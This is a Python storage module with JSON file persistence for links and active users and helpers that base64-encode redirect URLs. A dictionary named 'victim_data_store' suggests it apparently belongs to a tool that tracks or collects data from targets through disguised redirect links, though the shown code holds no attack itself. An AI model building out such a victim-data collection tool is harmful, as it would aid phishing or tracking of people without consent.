import json
import os
import base64

# In-memory storage
user_data = {}
link_cache = {}
victim_data_store = {}
user_username_cache = {}

# File storage
DATA_DIR = "/tmp/data"
os.makedirs(DATA_DIR, exist_ok=True)

LINKS_FILE = os.path.join(DATA_DIR, "links.json")
ACTIVE_USERS_FILE = os.path.join(DATA_DIR, "active_users.json")


def load_links():
    global link_cache
    if os.path.exists(LINKS_FILE):
        try:
            with open(LINKS_FILE, 'r') as f:
                link_cache = json.load(f)
            print(f"✅ Loaded {len(link_cache)} links")
        except Exception as e:
            print(f"Load links error: {e}")


def save_links():
    try:
        with open(LINKS_FILE, 'w') as f:
            json.dump(link_cache, f)
    except Exception as e:
        print(f"Save links error: {e}")


def encode_redirect(url):
    """Encode redirect URL in base64 for URL safety"""
    try:
        return base64.urlsafe_b64encode(url.encode()).decode().rstrip('=')
    except:
        return ""


def decode_redirect(encoded):
    """Decode redirect URL from base64"""
    try:
        padding = 4 - len(encoded) % 4
        if padding != 4:
            encoded += '=' * padding
        return base64.urlsafe_b64decode(encoded.encode()).decode()
    except:
        return ""


def load_active_users():
    if os.path.exists(ACTIVE_USERS_FILE):
        try:
            with open(ACTIVE_USERS_FILE, 'r') as f:
                return set(json.load(f))
        except:
            return set()
    return set()


def save_active_users(users_set):
    try:
        with open(ACTIVE_USERS_FILE, 'w') as f:
            json.dump(list(users_set), f)
    except Exception as e:
        print(f"Save error: {e}")


load_links()
active_users = load_active_users()
